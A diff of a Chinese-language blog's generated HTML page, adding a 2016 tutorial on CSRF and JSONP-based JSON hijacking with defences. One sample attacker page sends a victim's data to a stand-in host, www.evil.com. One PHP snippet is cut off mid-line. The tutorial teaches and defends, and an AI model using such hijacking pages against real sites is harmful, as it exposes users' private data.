@@ -3,17 +3,20 @@
 <head>
     <meta charset="utf-8">
     
-    <title>标签: pentest | 加油！少年</title>
+    <title>Cross Site Request Forgery | 加油！少年</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description">
-<meta property="og:type" content="website">
-<meta property="og:title" content="加油！少年">
-<meta property="og:url" content="/tags/pentest/index.html">
+    <meta name="description" content="CSRF全称Cross Site Request Forgery，即跨站点请求伪造。来源：http://drops.wooyun.org/web/15556">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cross Site Request Forgery">
+<meta property="og:url" content="/2016/07/19/Cross-Site-Request-Forgery/index.html">
 <meta property="og:site_name" content="加油！少年">
-<meta property="og:description">
+<meta property="og:description" content="CSRF全称Cross Site Request Forgery，即跨站点请求伪造。来源：http://drops.wooyun.org/web/15556">
+<meta property="og:image" content="http://ww2.sinaimg.cn/mw1024/d4008a20gw1f5yzk8p2krj20h407kwfe.jpg">
+<meta property="og:updated_time" content="2016-07-19T11:49:56.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="加油！少年">
-<meta name="twitter:description">
+<meta name="twitter:title" content="Cross Site Request Forgery">
+<meta name="twitter:description" content="CSRF全称Cross Site Request Forgery，即跨站点请求伪造。来源：http://drops.wooyun.org/web/15556">
+<meta name="twitter:image" content="http://ww2.sinaimg.cn/mw1024/d4008a20gw1f5yzk8p2krj20h407kwfe.jpg">
     
 
     
@@ -201,50 +204,202 @@
 </aside>
 
             
-            <section id="main">
-<div class="timeline timeline-wrap">
-    <div class="timeline-row timeline-row-major">
-        <span class="node"><i class="fa fa-tag"></i></span>
-        <h1 class="title">#pentest</h1>
-    </div>
-    
-        <div class="timeline-row">
-            <span class="node"></span>
-            <div class="content">
+            <section id="main"><article id="post-Cross-Site-Request-Forgery" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            
+	
+		<img src="http://ww2.sinaimg.cn/mw1024/d4008a20gw1f5yzk8p2krj20h407kwfe.jpg" class="article-banner" />
+	
+
+
+
+        
+        
+        
+            <header class="article-header">
                 
     
-        <h1 itemprop="name">
-            <a class="timeline-article-title" href="/2016/07/05/Web-For-Pentester/">Web For Pentester</a>
+        <h1 class="article-title" itemprop="name">
+            Cross Site Request Forgery
         </h1>
     
 
-                <div class="article-meta">
-                    
+                
+                    <div class="article-meta">
+                        
     <div class="article-date">
         <i class="fa fa-calendar"></i>
-        <a href="/2016/07/05/Web-For-Pentester/">
-            <time datetime="2016-07-05T05:01:47.000Z" itemprop="datePublished">2016-07-05</time>
+        <a href="/2016/07/19/Cross-Site-Request-Forgery/">
+            <time datetime="2016-07-19T01:39:42.000Z" itemprop="datePublished">2016-07-19</time>
         </a>
     </div>
 
 
-                    
-    <div class="article-category">
-    	<i class="fa fa-folder"></i>
-        <a class="article-category-link" href="/categories/Journey-of-Study/">Journey of Study</a>
-    </div>
-
-                    
+                        
+                        
     <div class="article-tag">
         <i class="fa fa-tag"></i>
-        <a class="tag-link" href="/tags/Web/">Web</a>, <a class="tag-link" href="/tags/pentest/">pentest</a>
+        <a class="tag-link" href="/tags/Web/">Web</a>
     </div>
 
-                </div>
-            </div>
+                    </div>
+                
+            </header>
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <p>CSRF全称Cross Site Request Forgery，即跨站点请求伪造。<br>来源：<a href="http://drops.wooyun.org/web/15556" target="_blank" rel="external">http://drops.wooyun.org/web/15556</a><br><a id="more"></a></p>
+<h2 id="0x1-简介"><a href="#0x1-简介" class="headerlink" title="0x1 简介"></a>0x1 简介</h2><p>跨站点请求伪造是攻击者构造的并非用户本意的请求被用户被动发出，攻击过程大致如图：<br><img src="http://static.wooyun.org//drops/20160510/20160510132314494821103.png" alt="CSRF"><br>例如攻击者在自己的网站构造了一个针对某网站的请求，然后诱骗受害者访问他的网站，而受害者又登录了被伪造请求的站点，此时这个伪造的请求将由被害者发出。比如攻击者可以诱使用户留言，更甚者可以让管理员添加一个被害者可以操控的账号为管理账号。</p>
+<h2 id="0x2-攻击方式"><a href="#0x2-攻击方式" class="headerlink" title="0x2 攻击方式"></a>0x2 攻击方式</h2><h3 id="0x2-1-HTML-CSRF攻击"><a href="#0x2-1-HTML-CSRF攻击" class="headerlink" title="0x2.1 HTML CSRF攻击"></a>0x2.1 HTML CSRF攻击</h3><p>即利用HTML元素发出GET请求（带有src属性的HTML标签都可以跨域发起GET请求），如：</p>
+<ol>
+<li>&lt;link href=”…”&gt;</li>
+<li>&lt;img src=”…”&gt;</li>
+<li>&lt;iframe src=”…”&gt;</li>
+<li>&lt;meta http-equiv=”refresh” content=”0; url=…”&gt;</li>
+<li>&lt;script src=”…”&gt;</li>
+<li>&lt;video src=”…”&gt;</li>
+<li>&lt;audio src=”…”&gt;</li>
+<li>&lt;a href=”…”&gt;</li>
+<li>&lt;table background=”…”&gt;</li>
+<li>…</li>
+</ol>
+<p>若要构造POST请求，则必须用表单提交的方式。另外，这些标签也可以用javascript动态生成，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    new Image().src=&apos;http://www.goal.com/...&apos;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x2-2-JSON-HiJacking攻击"><a href="#0x2-2-JSON-HiJacking攻击" class="headerlink" title="0x2.2 JSON HiJacking攻击"></a>0x2.2 JSON HiJacking攻击</h3><p>JSON是一种数据格式，主要由字典和列表两种存在形式，并且这两种形式也可以互相嵌套，常应用于数据传输的过程中。</p>
+<p>JSONP(JSON with Padding)是一种非官方的协议，是Web前端的javascript跨域获取数据的一种方式。javascript在读写数据时受到同源策略的限制，不可以读写其他的数据，于是大家想出了这样一种办法：</p>
+<p>前端html代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot; /&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt; </span><br><span class="line">    function jsonpCallback(result) &#123; </span><br><span class="line">        alert(result.a); </span><br><span class="line">        alert(result.b);</span><br><span class="line">        alert(result.c); </span><br><span class="line">        for(var i in result) &#123; </span><br><span class="line">            alert(i+&quot;:&quot;+result[i]);//循环输出a:1,b:2,etc. </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&lt;/script&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://crossdomain.com/services.php?callback=jsonpCallback&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>后端php代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//服务端返回JSON数据 </span><br><span class="line">$arr=array(&apos;a&apos;=&gt;1,&apos;b&apos;=&gt;2,&apos;c&apos;=&gt;3,&apos;d&apos;=&gt;4,&apos;e&apos;=&gt;5); </span><br><span class="line">$result=json_encode($arr); </span><br><span class="line">//echo $_GET[&apos;callback&apos;].&apos;(&quot;Hello,World!&quot;)&apos;; </span><br><span class="line">//echo $_GET[&apos;callback&apos;].&quot;($result)&quot;;</span><br><span class="line">//动态执行回调函数 </span><br><span class="line">$callback=$_GET[&apos;callback&apos;]; </span><br><span class="line">echo $c</span><br></pre></td></tr></table></figure>
+<p>前端先是定义了jsonpCallback函数来处理后端返回的JSON数据，然后利用script标签的src属性跨域获取数据（前面说到带src属性的html标签都可以跨域），并且把刚才定义的回调函数的名称传递给了后端，于是后端构造出“jsonpCallback({“a”:1, “b”:2, “c”:3, “d”:4, “e”:5})”的函数调用过程返回到前端执行，达到了跨域获取数据的目的。</p>
+<p>一句话描述JSONP：前端定义函数却在后端完成调用然后回到前端执行</p>
+<p>明白了JSONP的调用过程之后，可以想象这样的场景：</p>
+<p>当用户通过身份验证之后，前端会通过JSONP的方式从服务端获取该用户的隐私数据，然后再前端进行一些处理，如个性化显示等等。这个JSONP的调用借口如果没有做相应的防护，就容易受到JSON HiJacking的攻击，以上面的情景为例，攻击者可以构造以下html页面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot; /&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt; </span><br><span class="line">    function hijack(result) &#123; </span><br><span class="line">        var data = &apos;&apos;;</span><br><span class="line">        for(var i in result) &#123;</span><br><span class="line">            data += i + &apos;:&apos; + result[i];</span><br><span class="line">        &#125;</span><br><span class="line">        new Image().src = &quot;http://www.evil.com/JSONHiJacking.php?data=&quot; + escape(data);//把数据发送到攻击者服务器上</span><br><span class="line">    &#125; </span><br><span class="line">&lt;/script&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://crossdomain.com/services.php?callback=hijack&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>攻击者在页面中构造了自己的回调函数，把获取的数据都发送到了自己的服务器上。如果受害者已经经过身份认证并访问了此页面，隐私将被暴露</p>
+<h2 id="0x3-CSRF的危害"><a href="#0x3-CSRF的危害" class="headerlink" title="0x3 CSRF的危害"></a>0x3 CSRF的危害</h2><p>CSRF能做的事情大概如下：</p>
+<ul>
+<li>篡改目标网站上的用户数据</li>
+<li>盗取用户隐私数据</li>
+<li>作为其他攻击向量的辅助攻击手法</li>
+<li>传播CSRF蠕虫</li>
+</ul>
+<p>例子：</p>
+<ul>
+<li>添加管理员＋后台getshell <a href="http://www.wooyun.org/bugs/wooyun-2010-091886" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-091886</a></li>
+<li>直接在前端getshell <a href="http://www.wooyun.org/bugs/wooyun-2010-091875" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-091875</a></li>
+</ul>
+<h2 id="0x4-CSRF的防御"><a href="#0x4-CSRF的防御" class="headerlink" title="0x4 CSRF的防御"></a>0x4 CSRF的防御</h2><p>跨域请求伪造可以通过解决“跨域”问题来解决：</p>
+<ul>
+<li>HTTP请求头部的Referer检查（不过需要说明的是，有的时候请求并不需要跨域，有的时候甚至没有Referer字段）</li>
+</ul>
+<p>还可以解决“伪造”，攻击者之所以能够伪造请求，是因为请求中的参数值都是可以预测的，如果有无法预测的参数值，那么将无法伪造请求，基于此，有如下两种方法来防御：</p>
+<ul>
+<li>添加验证码（但可能会影响用户体验）</li>
+<li>使用一次性token（一定要足够随机）</li>
+</ul>
+<p>除了以上两点，CSRF都是发生在受害者已经完成身份认证之后发生的，基于这一点，可以用一些_缓解_CSRF攻击的方法：</p>
+<ul>
+<li>比如缩短session的有效时间等</li>
+</ul>
+
+        
         </div>
-    
+        <footer class="article-footer">
+            <div class="share-container">
+
+    <div class="jiathis_style">
+    <span class="jiathis_txt">分享到：</span>
+    <a class="jiathis_button_qzone">QQ空间</a>
+    <a class="jiathis_button_tsina">新浪微博</a>
+    <a class="jiathis_button_tqq">腾讯微博</a>
+    <a class="jiathis_button_weixin">微信</a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank">更多</a>
+    <a class="jiathis_counter_style"></a>
 </div>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<style>
+    .jiathis_style div:first-child:not(.jiadiv_01) {
+        width: auto !important;
+        border: none !important;
+    }
+    .jiathis_style .jiadiv_01 {
+        margin: 10px 0;
+        border-radius: 4px;
+        border: #e1e1e1 solid 1px;
+    }
+    .jiathis_style .jiadiv_01 div:first-child {
+        display: none;
+    }
+    .jiathis_style .jiadiv_02 {
+        padding: 7px 0 !important;
+    }
+    .jiathis_style .jiadiv_02 .jiatitle {
+        width: 85px;
+        border: none;
+        height: auto;
+        margin: 3px 10px;
+        padding: 6px 10px;
+        border-radius: 4px;
+    }
+    .jiathis_style .jiadiv_02 .jiatitle:hover {
+        border: none;
+    }
+    .jiathis_style .jiadiv_02 .jiatitle:nth-child(even) {
+        margin-left: 0;
+    }
+    .jiathis_style .jtico:hover {
+        opacity: 1;
+    }
+    .jiathis_style .ckepopBottom,
+    .jiathis_style .centerBottom {
+        width: auto !important;
+        padding: 5px;
+        background: #f7f7f7;
+    }
+</style>
+
+
+
+</div>
+
+            
+    
+        <a href="/2016/07/19/Cross-Site-Request-Forgery/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="/2016/07/19/Cross-Site-Request-Forgery/">评论</a>
+    
+
+        </footer>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+    
+        <a href="/2016/07/15/Same-Origin-Policy/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">下一篇</strong>
+            <div class="article-nav-title">Same Origin Policy</div>
+        </a>
+    
+</nav>
+
+
+    
+</article>
+
+
+    
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+    
+    </section>
+
 </section>
             
                 <aside id="sidebar">
@@ -424,11 +579,13 @@
     <script>
     var disqus_config = function () {
         
-        this.page.identifier = 'undefined';
+            this.page.url = '/2016/07/19/Cross-Site-Request-Forgery/';
+        
+        this.page.identifier = 'Cross-Site-Request-Forgery';
     };
     (function() { 
         var d = document, s = d.createElement('script');  
-        s.src = '//' + 'almondq' + '.disqus.com/count.js';
+        s.src = '//' + 'almondq' + '.disqus.com/embed.js';
         s.setAttribute('data-timestamp', +new Date());
         (d.head || d.body).appendChild(s);
     })();
